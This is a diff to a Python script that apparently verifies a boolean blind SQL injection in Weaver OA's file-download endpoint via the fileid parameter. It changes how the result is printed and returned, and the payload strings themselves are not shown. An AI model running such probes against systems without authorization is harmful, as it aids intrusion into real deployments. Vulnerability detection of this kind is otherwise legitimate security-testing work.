@@ -8,8 +8,8 @@ description: fileid参数引起的布尔盲注。
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class weaver_oa_download_sqli_BaseVerify:
     def __init__(self, url):
@@ -26,12 +26,12 @@ class weaver_oa_download_sqli_BaseVerify:
             req1 = requests.get(self.url+true_url, headers=headers, timeout=10, verify=False)
             req2 = requests.get(self.url+false_url, headers=headers, timeout=10, verify=False)
             if r"attachment" in str(req1.headers) and r"attachment" not in str(req2.headers):
-                cprint("[+]存在泛微OA filedownaction SQL注入漏洞...(高危)\tpayload: "+self.url+true_url, "red")
+                return "[+]存在泛微OA filedownaction SQL注入漏洞...(高危)\tpayload: "+self.url+true_url
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = weaver_oa_download_sqli_BaseVerify(sys.argv[1])
     testVuln.run()
